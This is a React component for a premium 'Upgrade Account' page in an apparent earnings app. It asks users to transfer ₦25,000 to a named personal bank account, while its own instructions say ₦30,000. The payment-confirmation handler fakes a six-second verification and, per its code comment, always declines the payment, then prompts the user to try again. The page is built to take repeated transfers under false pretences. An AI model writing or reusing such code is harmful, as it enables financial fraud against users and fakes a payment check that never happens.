import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { ArrowLeft, Crown, Copy, CheckCircle, AlertCircle, Loader2, Star } from 'lucide-react';
import { toast } from '@/hooks/use-toast';

interface UpgradeAccountPageProps {
  onBack: () => void;
  user: { name: string; email: string };
}

const UpgradeAccountPage: React.FC<UpgradeAccountPageProps> = ({ onBack, user }) => {
  const [showPaymentDialog, setShowPaymentDialog] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [paymentDeclined, setPaymentDeclined] = useState(false);

  const bankDetails = {
    bankName: "Moniepiont MFB",
    accountNumber: "5245141096",
    accountName: "BOMA HARRIET"
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: `${label} copied to clipboard`,
      duration: 2000,
    });
  };

  const handleUpgradeNow = () => {
    setShowPaymentDialog(true);
  };

  const handlePaymentMade = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      // Always decline payment for now
      setPaymentDeclined(true);
    }, 6000);
  };

  const handleCloseDialog = () => {
    setShowPaymentDialog(false);
    setPaymentConfirmed(false);
    setPaymentDeclined(false);
    setIsLoading(false);
  };

  const premiumFeatures = [
    "Withdrawal limit up to ₦1,000,000",
    "Priority customer support",
    "receive free fair code",
    "Exclusive premium offers",
    "Fast-track withdrawals",
    "VIP status badge"
  ];

  return (
    <div className="min-h-screen bg-gray-50 max-h-screen overflow-y-auto">
      {/* Header */}
      <div className="bg-gradient-to-r from-yellow-400 to-yellow-600 px-4 py-4 shadow-sm">
        <div className="flex items-center space-x-3">
          <button
            onClick={onBack}
            className="p-2 hover:bg-yellow-500/20 rounded-full transition-colors"
          >
            <ArrowLeft className="w-6 h-6 text-white" />
          </button>
          <h1 className="text-xl font-semibold text-white">Upgrade Account</h1>
        </div>
      </div>

      <div className="px-4 py-4 space-y-4">
        {/* Premium Account Banner */}
        <Card className="border-yellow-200 bg-gradient-to-br from-yellow-50 to-yellow-100">
          <CardContent className="p-6">
            <div className="text-center space-y-4">
              <div className="w-16 h-16 bg-yellow-500 rounded-full flex items-center justify-center mx-auto">
                <Crown className="w-8 h-8 text-white" />
              </div>
              <h2 className="text-2xl font-bold text-yellow-700">Premium Account</h2>
              <p className="text-yellow-600">
                Unlock unlimited earning potential with our premium features
              </p>
              <div className="bg-yellow-200 p-4 rounded-lg">
                <p className="text-yellow-800 font-bold text-xl">
                  Upgrade for just ₦25,000
                </p>
                <p className="text-sm text-yellow-700">
                  One-time payment • Lifetime benefits
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Features */}
        <Card>
          <CardContent className="p-6">
            <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
              <Star className="w-5 h-5 text-yellow-500 mr-2" />
              Premium Features
            </h3>
            <div className="space-y-3">
              {premiumFeatures.map((feature, index) => (
                <div key={index} className="flex items-center space-x-3">
                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0" />
                  <span className="text-gray-700">{feature}</span>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Bank Details */}
        <Card>
          <CardContent className="p-6">
            <h3 className="text-lg font-semibold text-gray-900 mb-4">Payment Details</h3>
            <div className="space-y-4">
              <div className="flex justify-between items-center">
                <span className="text-gray-600">Bank Name:</span>
                <div className="flex items-center space-x-2">
                  <span className="font-medium">{bankDetails.bankName}</span>
                  <button
                    onClick={() => copyToClipboard(bankDetails.bankName, 'Bank name')}
                    className="p-1 hover:bg-gray-100 rounded"
                  >
                    <Copy className="w-4 h-4 text-gray-500" />
                  </button>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-600">Account Number:</span>
                <div className="flex items-center space-x-2">
                  <span className="font-medium">{bankDetails.accountNumber}</span>
                  <button
                    onClick={() => copyToClipboard(bankDetails.accountNumber, 'Account number')}
                    className="p-1 hover:bg-gray-100 rounded"
                  >
                    <Copy className="w-4 h-4 text-gray-500" />
                  </button>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-gray-600">Account Name:</span>
                <div className="flex items-center space-x-2">
                  <span className="font-medium">{bankDetails.accountName}</span>
                  <button
                    onClick={() => copyToClipboard(bankDetails.accountName, 'Account name')}
                    className="p-1 hover:bg-gray-100 rounded"
                  >
                    <Copy className="w-4 h-4 text-gray-500" />
                  </button>
                </div>
              </div>

              <div className="flex justify-between items-center border-t pt-4">
                <span className="text-gray-600">Upgrade Fee:</span>
                <span className="font-bold text-yellow-600 text-lg">₦25,000.00</span>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Instructions */}
        <Card>
          <CardContent className="p-6">
            <h3 className="text-lg font-semibold text-gray-900 mb-4">Upgrade Instructions</h3>
            <ol className="list-decimal list-inside space-y-2 text-gray-700">
              <li>Transfer exactly ₦30,000 to the account details above</li>
              <li>Click "I have made the bank transfer" below</li>
              <li>Wait for payment confirmation</li>
              <li>Your account will be upgraded immediately</li>
              <li>Enjoy unlimited earning potential!</li>
            </ol>
          </CardContent>
        </Card>

        {/* Upgrade Button */}
        <Button
          onClick={handleUpgradeNow}
          className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-white py-3 rounded-full font-semibold"
        >
          Upgrade Now - ₦25,000
        </Button>
      </div>

      {/* Payment Confirmation Dialog */}
      <Dialog open={showPaymentDialog} onOpenChange={() => {}}>
        <DialogContent className="w-full h-full max-w-none m-0 rounded-none">
          <div className="text-center py-4">
            {isLoading ? (
              <>
                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Loader2 className="w-8 h-8 text-blue-600 animate-spin" />
                </div>
                <h2 className="text-xl font-semibold text-blue-600 mb-2">Verifying Payment</h2>
                <p className="text-gray-600 mb-4">
                  Please wait while we confirm your payment...
                </p>
              </>
            ) : paymentConfirmed ? (
              <>
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <CheckCircle className="w-8 h-8 text-green-600" />
                </div>
                <h2 className="text-xl font-semibold text-green-600 mb-2">Account Upgraded!</h2>
                <p className="text-gray-600 mb-4">
                  Congratulations! Your account has been upgraded to Premium. You can now withdraw up to ₦1,000,000.
                </p>
                <Button 
                  onClick={handleCloseDialog}
                  className="w-full bg-green-600 hover:bg-green-700 text-white"
                >
                  Continue
                </Button>
              </>
            ) : paymentDeclined ? (
              <>
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <AlertCircle className="w-8 h-8 text-red-600" />
                </div>
                <h2 className="text-xl font-semibold text-red-600 mb-2">Payment Not Confirmed</h2>
                <p className="text-gray-600 mb-4">
                  We couldn't confirm your payment. Please check your transfer details and try again.
                </p>
                <Button 
                  onClick={handleCloseDialog}
                  className="w-full bg-red-600 hover:bg-red-700 text-white"
                >
                  Try Again
                </Button>
              </>
            ) : (
              <>
                <h2 className="text-xl font-semibold text-gray-900 mb-4">Confirm Payment</h2>
                <p className="text-gray-600 mb-6">
                  Have you completed the bank transfer of ₦25,000?
                </p>
                <div className="space-y-3">
                  <Button 
                    onClick={handlePaymentMade}
                    className="w-full bg-yellow-600 hover:bg-yellow-700 text-white"
                  >
                    Yes, I have made the transfer
                  </Button>
                  <Button 
                    onClick={handleCloseDialog}
                    variant="outline"
                    className="w-full"
                  >
                    Cancel
                  </Button>
                </div>
              </>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default UpgradeAccountPage;
